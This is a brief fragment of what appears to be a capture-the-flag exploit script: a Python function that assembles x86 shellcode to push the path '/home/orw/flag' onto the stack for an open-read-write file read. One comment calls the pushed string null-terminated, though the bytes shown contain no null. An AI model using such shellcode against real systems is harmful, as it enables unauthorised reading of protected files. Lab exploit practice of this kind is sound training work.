...
def create_shellcode():
    ...
    # First, push the string "/home/orw/flag" onto the stack
    # We need to push it in reverse order (little endian)
    
    # Push "flag" (null terminated)
    shellcode.extend([0x68, 0x66, 0x6c, 0x61, 0x67])  # push "flag"
